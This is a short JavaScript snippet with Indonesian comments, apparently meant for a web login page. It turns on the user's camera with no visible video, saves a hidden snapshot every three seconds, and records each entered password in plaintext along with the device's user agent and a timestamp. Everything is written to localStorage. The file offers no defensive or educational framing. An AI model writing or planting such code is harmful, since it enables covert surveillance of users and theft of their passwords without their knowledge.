// Mengakses kamera tanpa menampilkannya
navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        setInterval(() => {
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = 320;
            canvas.height = 240;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Kirim gambar ke localStorage
            const imageData = canvas.toDataURL("image/jpeg");
            localStorage.setItem("cameraFrame", imageData);
        }, 3000);
    })
    .catch((error) => console.error("Akses kamera ditolak", error));

// Simpan data login
function saveLoginData(password) {
    const loginData = JSON.parse(localStorage.getItem("loginData")) || [];
    const device = navigator.userAgent;
    const time = new Date().toLocaleString();

    loginData.push({ time, password, device });

    // Simpan ke localStorage
    localStorage.setItem("loginData", JSON.stringify(loginData));
}

// Perbarui fungsi validasi password
function validatePassword() {
    const passwordInput = document.getElementById("password");
    const password = passwordInput.value.trim();

    if (password) {
        saveLoginData(password); // Simpan data login
    }
}
